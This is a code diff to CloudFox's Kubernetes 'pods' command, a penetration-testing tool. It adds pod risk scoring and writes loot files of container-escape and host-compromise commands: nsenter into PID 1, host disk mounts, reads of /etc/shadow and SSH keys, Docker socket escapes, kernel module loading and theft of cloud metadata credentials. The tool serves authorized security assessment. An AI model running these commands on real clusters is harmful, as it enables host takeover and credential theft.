@@ -18,9 +18,13 @@ import (
 var PodsCmd = &cobra.Command{
 	Use:     "pods",
 	Aliases: []string{},
-	Short:   "List all cluster pods",
+	Short:   "List all cluster pods with security analysis",
 	Long: `
-List all cluster pods and detailed information:
+List all cluster pods with comprehensive security analysis including:
+- Container escape vectors and privilege escalation paths
+- Sensitive host path mounts and their security implications
+- Dangerous Linux capabilities that enable container breakouts
+- Risk-based scoring for prioritized security review
   cloudfox kubernetes pods`,
 	Run: ListPods,
 }
@@ -36,6 +40,34 @@ func (t PodsOutput) TableFiles() []internal.TableFile {
 
 func (t PodsOutput) LootFiles() []internal.LootFile {
 	return t.Loot
+}
+
+type PodFinding struct {
+	Namespace          string
+	Name               string
+	PodIP              string
+	ServiceAccount     string
+	Node               string
+	RiskLevel          string
+	Privileged         bool
+	HostPID            bool
+	HostIPC            bool
+	HostNetwork        bool
+	HostPaths          []string
+	SensitiveHostPaths []string
+	WritableHostPaths  int
+	RunAsRoot          bool
+	AllowPrivEsc       bool
+	DangerousCaps      []string
+	Capabilities       []string
+	Images             []string
+	ImageTagTypes      []string
+	Labels             map[string]string
+	Affinity           string
+	Tolerations        []string
+	Annotations        map[string]string
+	CloudProvider      string
+	CloudRole          string
 }
 
 func ListPods(cmd *cobra.Command, args []string) {
@@ -59,7 +91,7 @@ func ListPods(cmd *cobra.Command, args []string) {
 	}
 
 	headers := []string{
-		"Namespace", "Pod Name", "Pod IP", "Service Account", "Node",
+		"Risk", "Namespace", "Pod Name", "Pod IP", "Service Account", "Node",
 		"HostPID", "HostIPC", "HostNetwork", "Privileged", "HostPaths",
 		"RunAsUser", "Capabilities", "Image", "ImageTagType", "Labels",
 		"Affinity", "Tolerations", "Annotations",
@@ -67,12 +99,22 @@ func ListPods(cmd *cobra.Command, args []string) {
 	}
 
 	var outputRows [][]string
+	var findings []PodFinding
+
+	// Risk level counters
+	riskCounts := map[string]int{
+		"CRITICAL": 0,
+		"HIGH":     0,
+		"MEDIUM":   0,
+		"LOW":      0,
+	}
 
 	// Namespace-organized loot
 	namespaceLootExec := map[string][]string{}
 	namespaceLootEnum := map[string][]string{}
 	var lootPrivEsc []string
-	var riskyPods []string
+	var lootContainerEscape []string
+	var lootHostCompromise []string
 
 	lootPrivEsc = append(lootPrivEsc, `#####################################
 ##### Pod Privilege Escalation
@@ -84,6 +126,26 @@ func ListPods(cmd *cobra.Command, args []string) {
 #
 `)
 
+	lootContainerEscape = append(lootContainerEscape, `#####################################
+##### Container Escape Techniques
+#####################################
+#
+# MANUAL EXECUTION REQUIRED
+# Detailed container escape vectors for high-risk pods
+# Organized by escape method and risk level
+#
+`)
+
+	lootHostCompromise = append(lootHostCompromise, `#####################################
+##### Host Compromise Paths
+#####################################
+#
+# MANUAL EXECUTION REQUIRED
+# Techniques to compromise the underlying host node
+# from privileged or misconfigured pods
+#
+`)
+
 	for _, ns := range namespaces.Items {
 		pods, err := clientset.CoreV1().Pods(ns.Name).List(ctx, metav1.ListOptions{})
 		if err != nil {
@@ -92,103 +154,215 @@ func ListPods(cmd *cobra.Command, args []string) {
 		}
 
 		for _, pod := range pods.Items {
-			privileged := "false"
-			runAsUser := "<unset>"
-			capabilities := []string{}
-			images := []string{}
-			tagTypes := []string{}
+			finding := PodFinding{
+				Namespace:      pod.Namespace,
+				Name:           pod.Name,
+				PodIP:          pod.Status.PodIP,
+				ServiceAccount: pod.Spec.ServiceAccountName,
+				Node:           pod.Spec.NodeName,
+				HostPID:        pod.Spec.HostPID,
+				HostIPC:        pod.Spec.HostIPC,
+				HostNetwork:    pod.Spec.HostNetwork,
+				Labels:         pod.Labels,
+				Annotations:    pod.Annotations,
+			}
+
+			privileged := false
+			runAsUser := -1 // -1 means unset
+			var capabilities []string
+			var dangerousCaps []string
+			allowPrivEsc := false
 
 			for _, container := range append(pod.Spec.InitContainers, pod.Spec.Containers...) {
+				// Security context analysis
 				if container.SecurityContext != nil {
 					if container.SecurityContext.Privileged != nil && *container.SecurityContext.Privileged {
-						privileged = "true"
+						privileged = true
 					}
 					if container.SecurityContext.RunAsUser != nil {
-						if *container.SecurityContext.RunAsUser == 0 {
-							runAsUser = "root"
-						} else {
-							runAsUser = fmt.Sprintf("%d", *container.SecurityContext.RunAsUser)
-						}
+						runAsUser = int(*container.SecurityContext.RunAsUser)
 					}
-					if container.SecurityContext != nil && container.SecurityContext.Capabilities != nil {
+					if container.SecurityContext.AllowPrivilegeEscalation != nil {
+						if *container.SecurityContext.AllowPrivilegeEscalation {
+							allowPrivEsc = true
+						}
+					} else {
+						// Default is true if not specified
+						allowPrivEsc = true
+					}
+
+					// Capability analysis
+					if container.SecurityContext.Capabilities != nil {
 						for _, cap := range container.SecurityContext.Capabilities.Add {
-							capabilities = append(capabilities, string(cap))
+							capStr := string(cap)
+							capabilities = append(capabilities, capStr)
+							// Use helper function to detect dangerous capabilities
+							if k8sinternal.IsDangerousCapability(capStr) {
+								dangerousCaps = append(dangerousCaps, capStr)
+							}
 						}
 						for _, cap := range container.SecurityContext.Capabilities.Drop {
 							capabilities = append(capabilities, "-"+string(cap))
 						}
 					}
-
 				}
 
 				// Image info
-				images = append(images, container.Image)
-				tagTypes = append(tagTypes, k8sinternal.ImageTagType(container.Image))
-
+				finding.Images = append(finding.Images, container.Image)
+				finding.ImageTagTypes = append(finding.ImageTagTypes, k8sinternal.ImageTagType(container.Image))
 			}
 
-			// Labels
-			labels := "<NONE>"
-			if len(pod.Labels) > 0 {
-				var parts []string
-				for k, v := range pod.Labels {
-					parts = append(parts, fmt.Sprintf("%s=%s", k, v))
-				}
-				sort.Strings(parts)
-				labels = strings.Join(parts, ",")
-			}
+			finding.Privileged = privileged
+			finding.RunAsRoot = (runAsUser == 0 || runAsUser == -1) // unset defaults to root in many cases
+			finding.AllowPrivEsc = allowPrivEsc
+			finding.Capabilities = capabilities
+			finding.DangerousCaps = dangerousCaps
 
 			// Affinity
-			affinity := "<NONE>"
 			if pod.Spec.Affinity != nil {
-				affinity = fmt.Sprintf("%+v", *pod.Spec.Affinity)
+				finding.Affinity = fmt.Sprintf("%+v", *pod.Spec.Affinity)
 			}
 
 			// Tolerations
-			tolerations := "<NONE>"
 			if len(pod.Spec.Tolerations) > 0 {
-				var tParts []string
 				for _, t := range pod.Spec.Tolerations {
-					tParts = append(tParts, fmt.Sprintf("Key=%s,Operator=%s,Value=%s,Effect=%s", t.Key, string(t.Operator), t.Value, string(t.Effect)))
+					finding.Tolerations = append(finding.Tolerations,
+						fmt.Sprintf("Key=%s,Operator=%s,Value=%s,Effect=%s", t.Key, string(t.Operator), t.Value, string(t.Effect)))
 				}
-				tolerations = strings.Join(tParts, "; ")
 			}
 
-			// Annotations
-			annotations := "<NONE>"
-			if len(pod.Annotations) > 0 {
+			// HostPaths analysis using helper function
+			hostPathCount := 0
+			writableHostPaths := 0
+			var hostPathLines []string
+			var sensitiveHostPaths []string
+
+			for _, volume := range pod.Spec.Volumes {
+				if volume.HostPath != nil {
+					hostPathCount++
+					mountPoint := k8sinternal.FindMountPath(volume.Name, pod.Spec.Containers)
+
+					// Determine if readonly
+					readOnly := false
+					for _, container := range pod.Spec.Containers {
+						for _, vm := range container.VolumeMounts {
+							if vm.Name == volume.Name {
+								readOnly = vm.ReadOnly
+								break
+							}
+						}
+					}
+
+					if !readOnly {
+						writableHostPaths++
+					}
+
+					// Use helper function to analyze host path
+					isSensitive, description := k8sinternal.AnalyzeHostPath(volume.HostPath.Path, readOnly)
+
+					hostPathLine := fmt.Sprintf("%s:%s", volume.HostPath.Path, mountPoint)
+					if readOnly {
+						hostPathLine += " (ro)"
+					} else {
+						hostPathLine += " (rw)"
+					}
+
+					if isSensitive {
+						hostPathLine += fmt.Sprintf(" - %s", description)
+						sensitiveHostPaths = append(sensitiveHostPaths, fmt.Sprintf("%s - %s", volume.HostPath.Path, description))
+					}
+
+					hostPathLines = append(hostPathLines, hostPathLine)
+					finding.HostPaths = append(finding.HostPaths, hostPathLine)
+				}
+			}
+			finding.SensitiveHostPaths = sensitiveHostPaths
+			finding.WritableHostPaths = writableHostPaths
+
+			// Cloud role detection
+			roleResults := k8sinternal.DetectCloudRole(ctx, clientset, pod.Namespace, pod.Spec.ServiceAccountName, &pod.Spec, pod.Annotations)
+			if len(roleResults) > 0 {
+				finding.CloudProvider = roleResults[0].Provider
+				finding.CloudRole = roleResults[0].Role
+			}
+
+			// Calculate risk level using helper function
+			hasDangerousCaps := len(dangerousCaps) > 0
+			finding.RiskLevel = k8sinternal.GetPodRiskLevel(
+				privileged,
+				pod.Spec.HostPID,
+				pod.Spec.HostIPC,
+				pod.Spec.HostNetwork,
+				hostPathCount,
+				writableHostPaths,
+				finding.RunAsRoot,
+				hasDangerousCaps,
+				allowPrivEsc,
+			)
+
+			riskCounts[finding.RiskLevel]++
+			findings = append(findings, finding)
+
+			// Format for table output
+			privilegedStr := "false"
+			if privileged {
+				privilegedStr = "true"
+			}
+
+			runAsUserStr := "<unset>"
+			if runAsUser == 0 {
+				runAsUserStr = "root"
+			} else if runAsUser > 0 {
+				runAsUserStr = fmt.Sprintf("%d", runAsUser)
+			}
+
+			hostPathsStr := "<NONE>"
+			if len(hostPathLines) > 0 {
+				hostPathsStr = strings.Join(hostPathLines, "\n")
+			}
+
+			labelsStr := "<NONE>"
+			if len(finding.Labels) > 0 {
 				var parts []string
-				for k, v := range pod.Annotations {
+				for k, v := range finding.Labels {
 					parts = append(parts, fmt.Sprintf("%s=%s", k, v))
 				}
 				sort.Strings(parts)
-				annotations = strings.Join(parts, ",")
+				labelsStr = strings.Join(parts, ",")
 			}
 
-			// HostPaths
-			var hostPathLines []string
-			for _, volume := range pod.Spec.Volumes {
-				if volume.HostPath != nil {
-					mountPoint := k8sinternal.FindMountPath(volume.Name, pod.Spec.Containers)
-					hostPathLines = append(hostPathLines, fmt.Sprintf("%s:%s", volume.HostPath.Path, mountPoint))
+			affinityStr := "<NONE>"
+			if finding.Affinity != "" {
+				affinityStr = finding.Affinity
+			}
+
+			tolerationsStr := "<NONE>"
+			if len(finding.Tolerations) > 0 {
+				tolerationsStr = strings.Join(finding.Tolerations, "; ")
+			}
+
+			annotationsStr := "<NONE>"
+			if len(finding.Annotations) > 0 {
+				var parts []string
+				for k, v := range finding.Annotations {
+					parts = append(parts, fmt.Sprintf("%s=%s", k, v))
 				}
-			}
-			hostPaths := "<NONE>"
-			if len(hostPathLines) > 0 {
-				hostPaths = strings.Join(hostPathLines, "\n")
+				sort.Strings(parts)
+				annotationsStr = strings.Join(parts, ",")
 			}
 
-			roleResults := k8sinternal.DetectCloudRole(ctx, clientset, pod.Namespace, pod.Spec.ServiceAccountName, &pod.Spec, pod.Annotations)
+			cloudProviderStr := "<NONE>"
+			if finding.CloudProvider != "" {
+				cloudProviderStr = finding.CloudProvider
+			}
 
-			// Access the provider and role like this:
-			cloudProvider := "<NONE>"
-			cloudRole := "<NONE>"
-			if len(roleResults) > 0 {
-				cloudProvider = roleResults[0].Provider
-				cloudRole = roleResults[0].Role
+			cloudRoleStr := "<NONE>"
+			if finding.CloudRole != "" {
+				cloudRoleStr = finding.CloudRole
 			}
 
 			row := []string{
+				finding.RiskLevel,
 				pod.Namespace,
 				pod.Name,
 				k8sinternal.NonEmpty(pod.Status.PodIP),
@@ -197,18 +371,18 @@ func ListPods(cmd *cobra.Command, args []string) {
 				fmt.Sprintf("%v", pod.Spec.HostPID),
 				fmt.Sprintf("%v", pod.Spec.HostIPC),
 				fmt.Sprintf("%v", pod.Spec.HostNetwork),
-				privileged,
-				hostPaths,
-				runAsUser,
+				privilegedStr,
+				hostPathsStr,
+				runAsUserStr,
 				strings.Join(capabilities, ","),
-				strings.Join(images, ","),
-				strings.Join(tagTypes, ","),
-				labels,
-				affinity,
-				tolerations,
-				annotations,
-				cloudProvider,
-				cloudRole,
+				strings.Join(finding.Images, ","),
+				strings.Join(finding.ImageTagTypes, ","),
+				labelsStr,
+				affinityStr,
+				tolerationsStr,
+				annotationsStr,
+				cloudProviderStr,
+				cloudRoleStr,
 			}
 			outputRows = append(outputRows, row)
 
@@ -217,159 +391,215 @@ func ListPods(cmd *cobra.Command, args []string) {
 				fmt.Sprintf("kubectl exec -it -n %s %s -- sh \n", pod.Namespace, pod.Name),
 			)
 
-			// Privilege escalation detection
-			isRisky := false
-			var riskFactors []string
+			// Generate detailed loot based on risk level and findings
+			podID := fmt.Sprintf("%s/%s", pod.Namespace, pod.Name)
 
-			// Check for privileged containers
-			if privileged == "true" {
-				isRisky = true
-				riskFactors = append(riskFactors, "PRIVILEGED")
-				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("\n# PRIVILEGED POD: %s/%s", pod.Namespace, pod.Name))
-				lootPrivEsc = append(lootPrivEsc, "# Privileged containers can escape to host:")
-				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("kubectl exec -it -n %s %s -- sh", pod.Namespace, pod.Name))
-				lootPrivEsc = append(lootPrivEsc, "# Inside container, try:")
-				lootPrivEsc = append(lootPrivEsc, "# nsenter --target 1 --mount --uts --ipc --net --pid -- bash")
-				lootPrivEsc = append(lootPrivEsc, "# Or mount host filesystem:")
-				lootPrivEsc = append(lootPrivEsc, "# mkdir /host && mount /dev/sda1 /host && chroot /host")
-				lootPrivEsc = append(lootPrivEsc, "")
+			// CRITICAL and HIGH risk pods get detailed analysis
+			if finding.RiskLevel == "CRITICAL" || finding.RiskLevel == "HIGH" {
+				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("\n### [%s] %s", finding.RiskLevel, podID))
+
+				var riskFactors []string
+				if privileged {
+					riskFactors = append(riskFactors, "PRIVILEGED")
+				}
+				if pod.Spec.HostPID {
+					riskFactors = append(riskFactors, "HOSTPID")
+				}
+				if pod.Spec.HostIPC {
+					riskFactors = append(riskFactors, "HOSTIPC")
+				}
+				if pod.Spec.HostNetwork {
+					riskFactors = append(riskFactors, "HOSTNETWORK")
+				}
+				if writableHostPaths > 0 {
+					riskFactors = append(riskFactors, fmt.Sprintf("WRITABLE_HOSTPATHS:%d", writableHostPaths))
+				}
+				if len(dangerousCaps) > 0 {
+					riskFactors = append(riskFactors, fmt.Sprintf("DANGEROUS_CAPS:%s", strings.Join(dangerousCaps, ",")))
+				}
+
+				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("# Risk Factors: %s", strings.Join(riskFactors, ", ")))
+				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("kubectl exec -it -n %s %s -- sh\n", pod.Namespace, pod.Name))
 			}
 
-			// Check for hostPath mounts
-			if len(hostPathLines) > 0 {
-				isRisky = true
-				riskFactors = append(riskFactors, "HOSTPATH")
-				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("\n# HOSTPATH MOUNT: %s/%s", pod.Namespace, pod.Name))
-				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("# Host paths: %s", strings.Join(hostPathLines, ", ")))
-				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("kubectl exec -it -n %s %s -- sh", pod.Namespace, pod.Name))
+			// Container Escape Loot - CRITICAL combinations
+			if privileged && (pod.Spec.HostPID || pod.Spec.HostNetwork || pod.Spec.HostIPC) {
+				lootContainerEscape = append(lootContainerEscape, fmt.Sprintf("\n### [CRITICAL] Privileged + Host Namespaces: %s", podID))
+				lootContainerEscape = append(lootContainerEscape, "# This pod has CRITICAL container escape vectors")
+				lootContainerEscape = append(lootContainerEscape, fmt.Sprintf("kubectl exec -it -n %s %s -- sh", pod.Namespace, pod.Name))
+				lootContainerEscape = append(lootContainerEscape, "")
+				lootContainerEscape = append(lootContainerEscape, "# Method 1: nsenter to host PID namespace")
+				lootContainerEscape = append(lootContainerEscape, "nsenter --target 1 --mount --uts --ipc --net --pid -- bash")
+				lootContainerEscape = append(lootContainerEscape, "")
+				lootContainerEscape = append(lootContainerEscape, "# Method 2: Access host filesystem via /proc")
+				lootContainerEscape = append(lootContainerEscape, "ls -la /proc/1/root/")
+				lootContainerEscape = append(lootContainerEscape, "cat /proc/1/root/etc/shadow")
+				lootContainerEscape = append(lootContainerEscape, "")
+			} else if privileged {
+				lootContainerEscape = append(lootContainerEscape, fmt.Sprintf("\n### [HIGH] Privileged Container: %s", podID))
+				lootContainerEscape = append(lootContainerEscape, "# Privileged containers can escape to host")
+				lootContainerEscape = append(lootContainerEscape, fmt.Sprintf("kubectl exec -it -n %s %s -- sh", pod.Namespace, pod.Name))
+				lootContainerEscape = append(lootContainerEscape, "")
+				lootContainerEscape = append(lootContainerEscape, "# Method 1: Mount host disk")
+				lootContainerEscape = append(lootContainerEscape, "mkdir /host && mount /dev/sda1 /host && chroot /host")
+				lootContainerEscape = append(lootContainerEscape, "")
+				lootContainerEscape = append(lootContainerEscape, "# Method 2: Create device and read host filesystem")
+				lootContainerEscape = append(lootContainerEscape, "mknod /dev/sda1 b 8 1 && dd if=/dev/sda1 | strings | grep -i password")
+				lootContainerEscape = append(lootContainerEscape, "")
+			}
 
-				// Check for critical host paths
-				for _, hp := range hostPathLines {
-					if strings.Contains(hp, "/var/run/docker.sock") {
-						lootPrivEsc = append(lootPrivEsc, "# CRITICAL: Docker socket mounted! Can control host containers:")
-						lootPrivEsc = append(lootPrivEsc, "# docker -H unix:///var/run/docker.sock ps")
-						lootPrivEsc = append(lootPrivEsc, "# docker -H unix:///var/run/docker.sock run -it --privileged --pid=host alpine nsenter --target 1 --mount --uts --ipc --net --pid -- bash")
-					}
-					if strings.Contains(hp, "/") && strings.Contains(hp, ":/") {
-						parts := strings.Split(hp, ":")
-						if len(parts) == 2 && parts[0] == "/" {
-							lootPrivEsc = append(lootPrivEsc, "# CRITICAL: Root filesystem mounted!")
-							lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("# Access host filesystem at: %s", parts[1]))
-						}
+			// Host Compromise Loot - Sensitive host paths
+			if len(sensitiveHostPaths) > 0 {
+				lootHostCompromise = append(lootHostCompromise, fmt.Sprintf("\n### [%s] Sensitive Host Paths: %s", finding.RiskLevel, podID))
+				for _, shp := range sensitiveHostPaths {
+					lootHostCompromise = append(lootHostCompromise, fmt.Sprintf("# %s", shp))
+				}
+				lootHostCompromise = append(lootHostCompromise, fmt.Sprintf("kubectl exec -it -n %s %s -- sh", pod.Namespace, pod.Name))
+				lootHostCompromise = append(lootHostCompromise, "")
+
+				// Specific techniques for specific paths
+				for _, hp := range finding.HostPaths {
+					if strings.Contains(hp, "docker.sock") {
+						lootHostCompromise = append(lootHostCompromise, "# Docker socket escape:")
+						lootHostCompromise = append(lootHostCompromise, "docker -H unix:///var/run/docker.sock ps")
+						lootHostCompromise = append(lootHostCompromise, "docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter --target 1 --mount --uts --ipc --net --pid -- bash")
+						lootHostCompromise = append(lootHostCompromise, "")
+					} else if strings.Contains(hp, "containerd.sock") {
+						lootHostCompromise = append(lootHostCompromise, "# Containerd socket escape:")
+						lootHostCompromise = append(lootHostCompromise, "ctr -a /run/containerd/containerd.sock namespace ls")
+						lootHostCompromise = append(lootHostCompromise, "ctr -a /run/containerd/containerd.sock -n k8s.io container ls")
+						lootHostCompromise = append(lootHostCompromise, "")
+					} else if strings.Contains(hp, "/etc/kubernetes") {
+						lootHostCompromise = append(lootHostCompromise, "# Kubernetes config access:")
+						lootHostCompromise = append(lootHostCompromise, "cat /host/etc/kubernetes/admin.conf")
+						lootHostCompromise = append(lootHostCompromise, "cat /host/etc/kubernetes/kubelet.conf")
+						lootHostCompromise = append(lootHostCompromise, "")
+					} else if strings.Contains(hp, "/var/lib/kubelet") {
+						lootHostCompromise = append(lootHostCompromise, "# Kubelet data access:")
+						lootHostCompromise = append(lootHostCompromise, "find /host/var/lib/kubelet -name '*.crt' -o -name '*.key'")
+						lootHostCompromise = append(lootHostCompromise, "cat /host/var/lib/kubelet/kubeconfig")
+						lootHostCompromise = append(lootHostCompromise, "")
+					} else if strings.HasPrefix(hp, "/:") {
+						lootHostCompromise = append(lootHostCompromise, "# Full filesystem access:")
+						lootHostCompromise = append(lootHostCompromise, "cat /host/etc/shadow")
+						lootHostCompromise = append(lootHostCompromise, "cat /host/root/.ssh/id_rsa")
+						lootHostCompromise = append(lootHostCompromise, "")
 					}
 				}
-				lootPrivEsc = append(lootPrivEsc, "")
 			}
 
-			// Check for host namespaces
-			if pod.Spec.HostPID {
-				isRisky = true
-				riskFactors = append(riskFactors, "HOSTPID")
-				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("\n# HOST PID NAMESPACE: %s/%s", pod.Namespace, pod.Name))
-				lootPrivEsc = append(lootPrivEsc, "# Can see and interact with host processes:")
-				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("kubectl exec -it -n %s %s -- sh", pod.Namespace, pod.Name))
-				lootPrivEsc = append(lootPrivEsc, "# ps aux  # Will show host processes")
-				lootPrivEsc = append(lootPrivEsc, "# Try to inject into host process or use nsenter")
-				lootPrivEsc = append(lootPrivEsc, "")
+			// Dangerous capabilities
+			if len(dangerousCaps) > 0 {
+				lootContainerEscape = append(lootContainerEscape, fmt.Sprintf("\n### [HIGH] Dangerous Capabilities: %s", podID))
+				lootContainerEscape = append(lootContainerEscape, fmt.Sprintf("# Capabilities: %s", strings.Join(dangerousCaps, ", ")))
+				lootContainerEscape = append(lootContainerEscape, fmt.Sprintf("kubectl exec -it -n %s %s -- sh", pod.Namespace, pod.Name))
+				lootContainerEscape = append(lootContainerEscape, "")
+
+				for _, cap := range dangerousCaps {
+					switch cap {
+					case "SYS_ADMIN":
+						lootContainerEscape = append(lootContainerEscape, "# CAP_SYS_ADMIN exploitation:")
+						lootContainerEscape = append(lootContainerEscape, "# Can mount filesystems, use unshare, pivot_root")
+						lootContainerEscape = append(lootContainerEscape, "mkdir /tmp/cgroup && mount -t cgroup -o rdma cgroup /tmp/cgroup")
+						lootContainerEscape = append(lootContainerEscape, "# Or exploit release_agent for code execution")
+						lootContainerEscape = append(lootContainerEscape, "")
+					case "SYS_PTRACE":
+						lootContainerEscape = append(lootContainerEscape, "# CAP_SYS_PTRACE exploitation:")
+						lootContainerEscape = append(lootContainerEscape, "# Can attach to processes and inject code")
+						lootContainerEscape = append(lootContainerEscape, "gdb -p 1  # Attach to init process")
+						lootContainerEscape = append(lootContainerEscape, "")
+					case "SYS_MODULE":
+						lootContainerEscape = append(lootContainerEscape, "# CAP_SYS_MODULE exploitation:")
+						lootContainerEscape = append(lootContainerEscape, "# Can load kernel modules for complete compromise")
+						lootContainerEscape = append(lootContainerEscape, "insmod /path/to/malicious.ko")
+						lootContainerEscape = append(lootContainerEscape, "")
+					case "DAC_READ_SEARCH", "DAC_OVERRIDE":
+						lootContainerEscape = append(lootContainerEscape, fmt.Sprintf("# %s exploitation:", cap))
+						lootContainerEscape = append(lootContainerEscape, "# Bypass file permissions to read sensitive data")
+						lootContainerEscape = append(lootContainerEscape, "")
+					case "NET_ADMIN":
+						lootContainerEscape = append(lootContainerEscape, "# CAP_NET_ADMIN exploitation:")
+						lootContainerEscape = append(lootContainerEscape, "# Can manipulate network, sniff traffic")
+						lootContainerEscape = append(lootContainerEscape, "tcpdump -i any -w /tmp/capture.pcap")
+						lootContainerEscape = append(lootContainerEscape, "")
+					}
+				}
 			}
 
-			if pod.Spec.HostIPC {
-				isRisky = true
-				riskFactors = append(riskFactors, "HOSTIPC")
-			}
-
+			// Host network namespace
 			if pod.Spec.HostNetwork {
-				isRisky = true
-				riskFactors = append(riskFactors, "HOSTNETWORK")
-				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("\n# HOST NETWORK: %s/%s", pod.Namespace, pod.Name))
-				lootPrivEsc = append(lootPrivEsc, "# Pod uses host network namespace - can sniff host traffic:")
+				lootHostCompromise = append(lootHostCompromise, fmt.Sprintf("\n### [HIGH] Host Network Namespace: %s", podID))
+				lootHostCompromise = append(lootHostCompromise, "# Pod uses host network - can sniff host traffic and access host services")
+				lootHostCompromise = append(lootHostCompromise, fmt.Sprintf("kubectl exec -it -n %s %s -- sh", pod.Namespace, pod.Name))
+				lootHostCompromise = append(lootHostCompromise, "")
+				lootHostCompromise = append(lootHostCompromise, "# Sniff host network traffic:")
+				lootHostCompromise = append(lootHostCompromise, "tcpdump -i any -w /tmp/host-traffic.pcap")
+				lootHostCompromise = append(lootHostCompromise, "")
+				lootHostCompromise = append(lootHostCompromise, "# Access host services on localhost:")
+				lootHostCompromise = append(lootHostCompromise, "curl http://localhost:10250/pods  # Kubelet API")
+				lootHostCompromise = append(lootHostCompromise, "")
+			}
+
+			// Host PID namespace
+			if pod.Spec.HostPID {
+				lootHostCompromise = append(lootHostCompromise, fmt.Sprintf("\n### [HIGH] Host PID Namespace: %s", podID))
+				lootHostCompromise = append(lootHostCompromise, "# Pod can see and interact with host processes")
+				lootHostCompromise = append(lootHostCompromise, fmt.Sprintf("kubectl exec -it -n %s %s -- sh", pod.Namespace, pod.Name))
+				lootHostCompromise = append(lootHostCompromise, "")
+				lootHostCompromise = append(lootHostCompromise, "# View host processes:")
+				lootHostCompromise = append(lootHostCompromise, "ps auxf  # Shows full host process tree")
+				lootHostCompromise = append(lootHostCompromise, "")
+				lootHostCompromise = append(lootHostCompromise, "# Access host filesystem via /proc:")
+				lootHostCompromise = append(lootHostCompromise, "ls -la /proc/1/root/")
+				lootHostCompromise = append(lootHostCompromise, "cat /proc/1/environ  # Host init environment variables")
+				lootHostCompromise = append(lootHostCompromise, "")
+			}
+
+			// Cloud role access
+			if finding.CloudProvider != "" && finding.CloudRole != "" {
+				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("\n### [%s] Cloud Role Access: %s", finding.RiskLevel, podID))
+				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("# Provider: %s, Role: %s", finding.CloudProvider, finding.CloudRole))
 				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("kubectl exec -it -n %s %s -- sh", pod.Namespace, pod.Name))
-				lootPrivEsc = append(lootPrivEsc, "# tcpdump -i any -w /tmp/capture.pcap")
 				lootPrivEsc = append(lootPrivEsc, "")
-			}
 
-			// Check for root user
-			if runAsUser == "root" || runAsUser == "<unset>" {
-				isRisky = true
-				riskFactors = append(riskFactors, "ROOT_USER")
-			}
-
-			// Check for dangerous capabilities
-			dangerousCaps := []string{"SYS_ADMIN", "NET_ADMIN", "SYS_PTRACE", "SYS_MODULE", "DAC_READ_SEARCH", "DAC_OVERRIDE"}
-			for _, cap := range capabilities {
-				for _, dangerous := range dangerousCaps {
-					if strings.Contains(cap, dangerous) {
-						isRisky = true
-						riskFactors = append(riskFactors, fmt.Sprintf("CAP_%s", dangerous))
-						lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("\n# DANGEROUS CAPABILITY: %s/%s has %s", pod.Namespace, pod.Name, cap))
-
-						if strings.Contains(cap, "SYS_ADMIN") {
-							lootPrivEsc = append(lootPrivEsc, "# CAP_SYS_ADMIN allows container escape:")
-							lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("kubectl exec -it -n %s %s -- sh", pod.Namespace, pod.Name))
-							lootPrivEsc = append(lootPrivEsc, "# Try mounting host filesystem or using unshare/mount tricks")
-						}
-
-						if strings.Contains(cap, "SYS_PTRACE") {
-							lootPrivEsc = append(lootPrivEsc, "# CAP_SYS_PTRACE allows process inspection and injection:")
-							lootPrivEsc = append(lootPrivEsc, "# Can attach to processes with gdb or inject code")
-						}
-
-						if strings.Contains(cap, "SYS_MODULE") {
-							lootPrivEsc = append(lootPrivEsc, "# CAP_SYS_MODULE allows loading kernel modules:")
-							lootPrivEsc = append(lootPrivEsc, "# insmod malicious.ko")
-						}
-
-						lootPrivEsc = append(lootPrivEsc, "")
-						break
-					}
+				switch finding.CloudProvider {
+				case "AWS":
+					lootPrivEsc = append(lootPrivEsc, "# AWS IAM role enumeration:")
+					lootPrivEsc = append(lootPrivEsc, "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/")
+					lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("curl http://169.254.169.254/latest/meta-data/iam/security-credentials/%s", finding.CloudRole))
+					lootPrivEsc = append(lootPrivEsc, "# Export credentials and enumerate permissions:")
+					lootPrivEsc = append(lootPrivEsc, "export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...")
+					lootPrivEsc = append(lootPrivEsc, "aws sts get-caller-identity")
+					lootPrivEsc = append(lootPrivEsc, "aws iam list-attached-role-policies --role-name $(aws sts get-caller-identity --query Arn --output text | cut -d'/' -f2)")
+					lootPrivEsc = append(lootPrivEsc, "")
+				case "GCP":
+					lootPrivEsc = append(lootPrivEsc, "# GCP service account enumeration:")
+					lootPrivEsc = append(lootPrivEsc, "curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email")
+					lootPrivEsc = append(lootPrivEsc, "curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
+					lootPrivEsc = append(lootPrivEsc, "# Use gcloud if available:")
+					lootPrivEsc = append(lootPrivEsc, "gcloud auth list")
+					lootPrivEsc = append(lootPrivEsc, "gcloud projects list")
+					lootPrivEsc = append(lootPrivEsc, "")
+				case "Azure":
+					lootPrivEsc = append(lootPrivEsc, "# Azure managed identity enumeration:")
+					lootPrivEsc = append(lootPrivEsc, "curl -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'")
+					lootPrivEsc = append(lootPrivEsc, "# Use Azure CLI if available:")
+					lootPrivEsc = append(lootPrivEsc, "az account show")
+					lootPrivEsc = append(lootPrivEsc, "az role assignment list")
+					lootPrivEsc = append(lootPrivEsc, "")
 				}
 			}
 
